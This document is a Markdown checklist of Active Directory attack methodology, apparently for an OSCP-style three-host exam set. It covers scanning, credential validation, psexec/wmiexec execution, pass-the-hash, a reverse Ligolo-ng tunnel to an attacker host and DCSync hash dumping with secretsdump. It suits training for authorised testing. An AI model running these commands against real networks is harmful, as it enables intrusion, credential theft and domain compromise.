# Active Directory Set Methodology

Use this as a priority-ordered checklist for a three-target AD set. Assume the supplied identity may be valid only for one host or one service; validate it before moving laterally. Keep the target ledger and exact command output current as the set changes.

## 1. Confirm scope, roles, and a clean evidence ledger

- [ ] Label the in-scope machines as T1, T2, and T3 until enumeration proves otherwise.
- [ ] Record hostname, IP, DNS alias, domain, DC FQDN/IP, and all discovered subnets in the evidence log.
- [ ] Create separate scan and loot directories for each target and keep the raw output from every test.
- [ ] Confirm the exam rules before using an exploit framework or changing ACLs, SPNs, or service state.
- [ ] Start with [nmap](Enumeration/Port%20Scanning.md), [SMB Enumeration](Enumeration/SMB%20Enumeration.md), and [Common Ports](Enumeration/Common%20Ports.md) checks on all three targets.

```bash
export T1=<target1-ip> T2=<target2-ip> T3=<target3-ip>
mkdir -p ~/oscp/ad-set/{T1,T2,T3,loot}
nmap -Pn -n -p- --min-rate 3000 -oN ~/oscp/ad-set/T1/tcp-all.txt "$T1"
nmap -Pn -n -sC -sV -p <open-ports> -oN ~/oscp/ad-set/T1/tcp-services.txt "$T1"
sudo nmap -Pn -n -sU --top-ports 100 -oN ~/oscp/ad-set/T1/udp-top.txt "$T1"
```

- [ ] Repeat the same flow for T2 and T3 and re-scan any new hostnames or internal subnets.
- [ ] Prefer SMB/RPC, LDAP/Kerberos/DNS, WinRM/RDP, web, and database services before assuming a credential is valid everywhere.
- [ ] Add the discovered DC FQDN to the local hosts file and use FQDN-based Kerberos operations.
- [ ] If Kerberos reports clock skew, synchronize time with the domain before further ticket or authentication work.

## 2. Validate the supplied credential safely

- [ ] Try the supplied identity against each in-scope host and service before assuming it is domain-wide.
- [ ] Determine whether the account is local, domain, or a service identity before using it for lateral movement.
- [ ] Check the domain lockout policy before any password spray or broad repeated failures.
- [ ] Use the most relevant validation path from [AD Credential Hunting](Active%20Directory/Credential%20Hunting.md), [Password Spraying](Active%20Directory/Password%20Spraying.md), and [Other AD Abuse](Active%20Directory/Other.md).

```bash
nxc smb <host-or-in-scope-range> -d <domain> -u <user> -p '<password>'
nxc smb <host> -d <domain> -u <user> -p '<password>' --shares
nxc ldap <dc-ip> -d <domain> -u <user> -p '<password>'
nxc winrm <host> -d <domain> -u <user> -p '<password>'
```

- [ ] If you have an NT hash, validate it with `-H <NT-hash>` where the tool supports it.
- [ ] If login returns `STATUS_PASSWORD_MUST_CHANGE`, record it and use the approved password-change path; do not hammer the expired password.
- [ ] Treat a valid SMB login as a credential lead, not as proof of remote command execution.

## 3. Get a first shell and capture the user flag

- [ ] Use the least disruptive path the evidence supports: web app RCE, WinRM, RDP, or an authorized SMB/DCOM execution method.
- [ ] Prefer a safe and specific execution path from [Initial Foothold](initial-foothold.md) and [Windows Foothold](Initial%20Foothold/Windows%20Foothold.md).
- [ ] Record hostname, user, groups, privileges, OS/build, interfaces, routes, and listeners on every foothold.
- [ ] Immediately capture the user flag and record the exact file path and value before moving on.
- [ ] Run the matching PE checklist in [Windows Privilege Escalation](winfows-pe.md) or [Linux Privilege Escalation](linux-pe.md) after each foothold.

```bash
impacket-psexec '<domain>/<user>:<password>'@<host>
impacket-wmiexec '<domain>/<user>:<password>'@<host>
impacket-GetTGT '<domain>/<user>:<password>' -dc-ip <dc-ip>
```

- [ ] If the host is the XAMPP pattern, inspect the SMB share for `C:\xampp\passwords.txt`, `phpMyAdmin\config.inc.php`, `mysql\bin\my.ini`, Apache configuration, and app configs.
- [ ] Validate any recovered MySQL credentials against the local service before assuming they are valid elsewhere.
- [ ] Confirm `FILE` privilege, `secure_file_priv`, and the actual web root before trying `SELECT ... INTO OUTFILE`.
- [ ] Verify the shell identity and avoid assuming a web service runs as SYSTEM or Domain Admin.

## 4. Enumerate AD with valid credentials

- [ ] Run AD collection as soon as you have a valid domain credential and save the raw output.
- [ ] Use [BloodHound CE](Active%20Directory/Attack%20Paths.md) and the shortest-path view to check for high-value group and computer targets.
- [ ] Prioritize the following in order: user descriptions, SYSVOL, GPP `cpassword`, accessible shares, AS-REP roastable users, Kerberoastable SPNs, ACL edges, delegation, certificate paths, LAPS/gMSA reads, and local-admin reuse.

```bash
rusthound-ce --domain <domain> -u <user> -p '<password>' -z
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --users
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --groups
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --shares
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' -M spider_plus
ldapdomaindump -u '<domain>\\<user>' -p '<password>' <dc-ip>
```

- [ ] Check the exact object ACL and group membership before owning a new path.
- [ ] Test only hashes obtained from in-scope accounts rather than broad roast requests.
- [ ] Prefer one confirmed credential over a broad password spray.

## 5. Turn each AD finding into a tested abuse path

- [ ] Match the finding to the specific abuse path in [ACL Abuse](Active%20Directory/ACL%20Abuse.md), [Delegation Abuse](Active%20Directory/Delegation%20Abuse.md), [AD CS Certificates](Active%20Directory/Certificates.md), [GPO Abuse](Active%20Directory/GPO%20Abuse.md), or [Privilege Abuses](Active%20Directory/Privilege%20Abuses.md).
- [ ] Re-run graph and ACL analysis after every change in ownership, membership, SPN, or delegation.
- [ ] Confirm the exact right, target object, and resulting access before making a change.

| Finding | High-priority next step |
|---|---|
| User or group ACL edge | Use the matching minimal abuse in [ACL Abuse](Active%20Directory/ACL%20Abuse.md) and re-collect afterward. |
| Delegation or computer ACL | Follow the unconstrained, constrained, or RBCD chain in [Delegation Abuse](Active%20Directory/Delegation%20Abuse.md). |
| ESC or certificate path | Run `certipy-ad find -vulnerable` and follow [AD CS Certificates](Active%20Directory/Certificates.md). |
| Writable GPO or linked target | Use [GPO Abuse](Active%20Directory/GPO%20Abuse.md) and verify policy refresh. |
| LAPS or gMSA read | Retrieve only the permitted password/hash and continue with the specific host. |
| Replication or Domain Admin rights | Validate the access and use DCSync only if justified by the host and evidence. |

- [ ] If the path involves RBCD, keep the target FQDN, SPN, ticket cache, and resulting access in the log.

## 6. Pivot through the set with Ligolo-ng

- [ ] Use [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md) only after a host is confirmed to have additional interfaces or a route to a new segment.
- [ ] Confirm the internal subnet from `ipconfig /all`, `route print`, `ip addr`, or `ip route` before adding a route.
- [ ] Start the tunnel on the attacker and connect the agent from the compromised host.

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert
```

```powershell
.\agent.exe -connect <attacker-vpn-ip>:11601 -ignore-cert
```

```text
session
ifconfig
start --tun ligolo
```

```bash
sudo ip route add <internal-subnet>/<prefix> dev ligolo
ip route
nmap -Pn -n -p- <new-internal-host>
nxc smb <new-internal-host> -d <domain> -u <user> -p '<password>' --shares
```

- [ ] Re-scan only the in-scope addresses reachable through the tunnel.
- [ ] Hunt for local flags, saved sessions, XAMPP secrets, `confCons.xml`, PSReadLine history, and SAM/SYSTEM backups on each new host.
- [ ] Repeat the route/scan/credential loop if another segment is genuinely reachable through a second compromised host.

## 7. Lateral movement and local escalation loop

- [ ] Validate each recovered password, hash, or ticket against SMB, LDAP, WinRM, RDP, and all relevant service protocols.
- [ ] Record local-vs-domain context for every credential before reusing it.
- [ ] For each new host, enumerate shares, sessions, services, local admins, and privilege level before moving to the next target.
- [ ] If local admin or a relevant privilege is confirmed, run the PE checklist on that host before continuing.
- [ ] After successful PE, immediately capture the elevated flag for that host and record the identity and proof.

```bash
nxc smb <host> -d <domain> -u <user> -H <nt-hash>
impacket-wmiexec '<domain>/<user>@<host>' -hashes ':<nt-hash>'
impacket-psexec '<domain>/<user>@<host>' -hashes ':<nt-hash>'
```

- [ ] Preserve ticket caches and exact SPN principal data when using TGTs or service tickets.
- [ ] Remove temporary ACL, RBCD, or account changes when safe and permitted and record what was changed.

## 8. Domain-compromise verification and final sweep

- [ ] Only call a host or set compromised when the identity and flag are both confirmed.
- [ ] If you have a justified DA-equivalent identity or replication rights, validate it against the DC before claiming domain compromise.
- [ ] Use `impacket-secretsdump` with `-just-dc` to verify a DC-appropriate DCSync path when the rights support it.

```bash
impacket-secretsdump '<domain>/<user>:<password>'@<dc-ip> -just-dc
impacket-secretsdump '<domain>/<user>@<dc-ip>' -hashes ':<nt-hash>' -just-dc
```

- [ ] Reconcile the three-target ledger: user flag, elevated flag, proof source, hashes/tickets used, and any untouched target.
- [ ] Do not report a flag as captured unless the value itself is read and recorded.
- [ ] Hand off the final verified path to [Windows Privilege Escalation](winfows-pe.md), [Windows Lateral Movement](Lateral%20Movement/Windows.md), and [AD Set Methodology](Active%20Directory/Active%20Directory%20Methodology.md) as needed.
